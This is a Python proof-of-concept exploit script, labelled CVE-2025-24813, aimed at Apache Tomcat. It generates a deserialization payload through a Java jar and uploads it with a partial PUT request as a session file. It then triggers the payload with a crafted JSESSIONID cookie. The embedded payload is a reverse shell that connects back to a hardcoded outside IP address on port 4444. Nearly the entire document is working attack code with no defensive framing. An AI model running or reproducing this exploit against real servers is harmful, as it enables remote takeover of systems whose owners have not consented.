import requests
import base64
import os, subprocess
import argparse

def payload_generator(shellcode):
    return subprocess.check_output(["java", "-jar", "lib/target/demo-1.0-SNAPSHOT.jar", shellcode]).decode()

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-24813 Apache Tomcat Vulnerability PoC")
    parser.add_argument('--url', required=True, help='Target URL, e.g., http://127.0.0.1:8080/')
    args = parser.parse_args()

    TARGET_IP = args.url.rstrip('/')

    # Check if URL starts with http:// or https://
    if not (TARGET_IP.startswith('http://') or TARGET_IP.startswith('https://')):
        print("Error: URL must start with 'http://' or 'https://'.")
        return

    b64_encoded_payload = payload_generator("sh -i >& /dev/tcp/31.97.223.21/4444 0>&1")

    decoded_content = base64.b64decode(b64_encoded_payload)

    put_url = f"{TARGET_IP}/payload.session"
    put_headers = {"Content-Range": "bytes 0-5/100"}

    put_response = requests.put(put_url, data=decoded_content, headers=put_headers)

    get_headers = {"Cookie": "JSESSIONID=.payload"}
    get_response = requests.head(TARGET_IP, headers=get_headers)
    print(get_response.text)

    # Check the response status
    if get_response.status_code == 500:
        print("[+] Exploit most likely succeeded")
    else:
        print(f"[-] Exploit failed with status code: {get_response.status_code}, instead of 500,409")


if __name__ == "__main__":
    main()